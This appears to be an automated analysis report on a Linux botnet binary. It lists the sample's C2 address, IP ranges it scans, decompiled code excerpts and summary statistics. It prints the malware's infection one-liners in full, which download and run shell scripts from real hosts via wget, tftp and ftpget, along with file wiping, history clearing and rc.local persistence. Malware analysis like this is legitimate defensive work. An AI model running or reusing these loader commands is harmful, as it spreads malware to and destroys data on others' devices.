%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
185.158.113.30:777
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
43.252.%d.%d
43.239.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
77.209.%d.%d
88.5.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
60.0.%d.%d
60.16.%d.%d
163.53.%d.%d
62.30.%d.%d
62.252.%d.%d
62.254.%d.%d
62.255.%d.%d
77.96.%d.%d
77.97.%d.%d
77.98.%d.%d
77.100.%d.%d
77.102.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.230.%d.%d
43.240.%d.%d
43.245.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
cd /root;rm -rf .bash_history
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
ClearHistory
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
 cd /var/; rm -rf cuntysshd; wget http://64.137.253.50/cuntysshd || tftp -r cuntysshd -g 64.137.253.50; chmod 777 cuntysshd; ./cuntysshd; rm -rf cuntysshd
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 68413
+++TOTAL FUNCTIONS 			:263
+++LINES PER FUNCTION RATIO 	: 260.125475285171
+++SUSPECTED LINES COUNT 	: 1712
+++SUSPECTED LINES RATIO 	: 2.50244836507681
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 68413
+++WHILE (TRUE) LINES			: 14266
+++WHILE (TRUE) LINES RATION		:20.8527619019777%
+++WHILE (TRUE) LOOPS COUNT		: 183
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n",
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v139, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v139, 0);
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v139, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v139, 0);
    int32_t v138 = __libc_open("/proc/cpuinfo", 0); // 0x8048ea1
    int32_t v138 = __libc_open("/proc/cpuinfo", 0); // 0x804905e
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");
                int32_t v143 = __libc_open("/proc/net/route", 0); // 0x804ed93
    *(int32_t *)&v137 = (int32_t)"/etc/rc.d/rc.local";
    int32_t v144 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)&v143); // 0x804efa3
    int32_t v146 = (int32_t)"/etc/rc.d/rc.local"; // 0x804f12115
        *(int32_t *)&v137 = (int32_t)"/etc/rc.conf";
        int32_t v147 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)&v143); // 0x804efc6
        v146 = (int32_t)"/etc/rc.conf";
                                int32_t v178 = __GI_fopen(v146, (int32_t)&v177); // 0x804f124
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(a1, (char *)a2, 0, -1);
int32_t _stdio_fopen(int32_t a1, char * a2, int32_t a3, int32_t a4) {
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    if (__libc_open("/dev/null", v140) != v138) {
    int32_t v139 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v138); // 0x80554f9
    int32_t v152 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v138); // 0x8055517
    int32_t v138 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v137); // 0x8056391
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v137);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",

        "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",

        "185.158.113.30:777"

    char (*v55)[19] = "185.158.113.30:777";

        "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n",

        szprintf(v149, (int32_t)"43.252.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v150, (int32_t)"43.239.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v151, (int32_t)"85.3.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v152, (int32_t)"37.158.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v153, (int32_t)"95.9.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v154, (int32_t)"41.252.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v155, (int32_t)"58.71.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v156, (int32_t)"104.55.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v157, (int32_t)"78.186.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v158, (int32_t)"78.189.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v159, (int32_t)"77.209.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v160, (int32_t)"88.5.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v161, (int32_t)"43.239.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v162, (int32_t)"103.20.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v163, (int32_t)"103.47.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v164, (int32_t)"103.57.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v165, (int32_t)"45.117.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v166, (int32_t)"101.51.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v167, (int32_t)"137.59.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v168, (int32_t)"1.56.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v169, (int32_t)"1.188.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v170, (int32_t)"14.204.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v171, (int32_t)"27.0.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v172, (int32_t)"27.8.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v173, (int32_t)"27.50.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v174, (int32_t)"27.54.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v175, (int32_t)"27.98.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v176, (int32_t)"27.112.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v177, (int32_t)"27.192.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v178, (int32_t)"36.32.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v179, (int32_t)"36.248.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v180, (int32_t)"39.64.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v181, (int32_t)"42.4.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v182, (int32_t)"42.48.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v183, (int32_t)"42.52.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v184, (int32_t)"42.56.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v185, (int32_t)"42.63.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v186, (int32_t)"42.84.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v187, (int32_t)"42.176.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v188, (int32_t)"42.224.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v189, (int32_t)"42.176.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v190, (int32_t)"60.0.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v191, (int32_t)"60.16.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v192, (int32_t)"163.53.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v193, (int32_t)"62.30.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v194, (int32_t)"62.252.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v195, (int32_t)"62.254.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v196, (int32_t)"62.255.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v197, (int32_t)"77.96.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v198, (int32_t)"77.97.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v199, (int32_t)"77.98.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v200, (int32_t)"77.100.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v201, (int32_t)"77.102.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v202, (int32_t)"113.191.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v203, (int32_t)"81.100.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v204, (int32_t)"113.188.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v205, (int32_t)"113.189.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v206, (int32_t)"94.174.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v207, (int32_t)"14.160.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v208, (int32_t)"14.161.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v209, (int32_t)"14.162.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v210, (int32_t)"14.163.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v211, (int32_t)"14.164.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v212, (int32_t)"14.165.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v213, (int32_t)"14.166.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v214, (int32_t)"14.167.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v215, (int32_t)"14.168.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v216, (int32_t)"14.169.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v217, (int32_t)"14.170.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v218, (int32_t)"14.171.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v219, (int32_t)"14.172.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v220, (int32_t)"14.173.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v221, (int32_t)"14.174.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v222, (int32_t)"14.175.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v223, (int32_t)"14.176.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v224, (int32_t)"14.177.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v225, (int32_t)"14.178.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v226, (int32_t)"14.179.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v227, (int32_t)"14.180.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v228, (int32_t)"14.181.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v229, (int32_t)"14.182.%d.%d", (int32_t)v136, (int32_t)v137);

        szprintf(v230, (int32_t)"14.183.%d.%d", (int32_t)v136, (int32_t)v137);

